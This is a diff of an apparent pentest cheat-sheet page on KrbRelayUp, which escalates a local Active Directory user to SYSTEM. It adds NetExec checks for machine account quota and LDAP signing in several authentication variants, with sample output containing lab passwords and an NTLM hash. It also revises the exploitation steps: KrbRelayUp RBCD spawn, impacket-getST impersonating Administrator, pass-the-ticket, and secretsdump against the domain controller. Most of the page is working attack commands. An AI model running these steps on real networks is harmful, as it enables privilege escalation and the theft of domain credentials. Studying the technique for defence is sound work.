@@ -1,41 +1,147 @@
 ---
 title: "KrbRelayUp"
-tags: ["KrbRelayUp", "Active Directory", "Local Privilege Escalation", "Kerberos Relay", "LDAP Signing", "Shadow Credentials", "ADCS Web Enrollment", "RBCD", "S4U2Self", "SCMUACBypass"]
+tags: ["Active Directory", "KrbRelayUp", "ADCS Web Enrollment", "Kerberos Relay", "LDAP Signing", "Local Privilege Escalation", "RBCD", "S4U2Self", "SCMUACBypass", "Shadow Credentials"]
 ---
+
+{{< filter_buttons >}}
 
 ### Prerequisite
 
-#### 1. Machine Quota
+#### 1. Check Machine Quota
 
-```console
-nxc ldap <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
+```console {class="password"}
+# Password
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
 ```
 
 ```console {class="sample-code"}
-$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password' -d example.com -M maq
+$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M maq
 LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
-LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
 MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
 MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
 ```
 
-#### 2. LDAP Signing NOT Enforced
-
-```console
-nxc ldap <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M ldap-checker
+```console {class="ntlm"}
+# NTLM
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M maq
 ```
 
 ```console {class="sample-code"}
-$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password' -d example.com -M ldap-checker
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -M maq
 LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
-LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -p 'Password123!' -d giveback.htb -k --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -k --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+#### 2. Check LDAP Signing NOT Enforced
+
+```console {class="password"}
+# Password
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M ldap-checker
+```
+
+```console {class="sample-code"}
+$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M ldap-checker
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123!
+LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
+LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M ldap-checker
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -M ldap-checker
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
+LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M ldap-checker
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -p 'Password123!' -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123!
+LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
+LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M ldap-checker
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
+LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M ldap-checker
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M ldap-checker
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
 LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
 LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
 ```
 
 ---
 
-### Abuse #1: Create Control Primitive over Local Machine using RBCD
+### Create Control Primitive over Local Machine using RBCD
 
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
@@ -70,6 +176,7 @@ KrbRelayUp - Relaying you to SYSTEM
 #### 2. Obtain a Kerberos Service Ticket and Use it to Create a New Service Running as SYSTEM
 
 ```console
+# Password
 .\KrbRelayUp.exe spawn -m rbcd -d <DOMAIN> -dc <DC> -cn <NEW_COMPUTER>$ -cp <NEW_PASSWORD>
 ```
 
@@ -105,7 +212,8 @@ KrbRelayUp - Relaying you to SYSTEM
 #### 3. Request a Service Ticket
 
 ```console
-impacket-getST -spn cifs/<DC> -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>'   
+# Password
+impacket-getST -spn <SPN> -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>'   
 ```
 
 ```console {class="sample-code"}
@@ -123,8 +231,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 #### 4. Secrets Dump
 
 ```console
-# Import ticket
-export KRB5CCNAME='Administrator@cifs_<DC>@<DOMAIN>.ccache'
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE>'
 ```
 
 ```console {class="sample-code"}
@@ -147,7 +255,7 @@ Valid starting       Expires              Service principal
 ```
 
 ```console
-# Secrets dump
+# Ticket-based Kerberos
 impacket-secretsdump -k -no-pass <DC>
 ```
 
